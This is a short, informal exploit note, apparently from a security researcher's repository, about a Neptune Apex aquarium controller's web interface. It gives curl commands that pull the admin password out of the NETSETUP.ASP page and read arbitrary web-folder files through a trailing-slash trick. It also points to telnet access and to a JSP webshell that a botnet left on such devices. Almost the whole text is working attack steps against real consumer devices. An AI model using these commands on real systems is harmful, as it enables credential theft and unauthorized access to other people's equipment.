 ** Admin Password Leak **

Go to IP:PORT/NETSETUP.ASP or IP:PORT/NETSETUP.SHT Check the response / DOM the admin password is inside :)
You may be able to TELNET into it if its exposed (some commands here :https://github.com/Stonyx/AquaBusLib/blob/master/docs/ApexDebug.md)

as said in the manual 

"Configure your Apex for external Internet access. Do this up front and Neptune support can
frequently telnet directly into your controller to help support you."


curl http://IP:PORT/NETSETUP.ASP | grep input | grep admin

funny fact  : some guys seems to have been spread this --> https://www.zscaler.com/blogs/security-research/recent-bulehero-botnet-payload 
but they've upload a JSP webshell that won't execute :*)

you may see the FxCodeShell.jsp shell in the webfolder

** WEB FILE READ **

You can read all the files in the webfolder by adding / at the end of the url (you can find default filenames in /files.txt)

curl http://IP:PORT/nstatus.sht
curl http://IP:PORT/nstatus.sht/
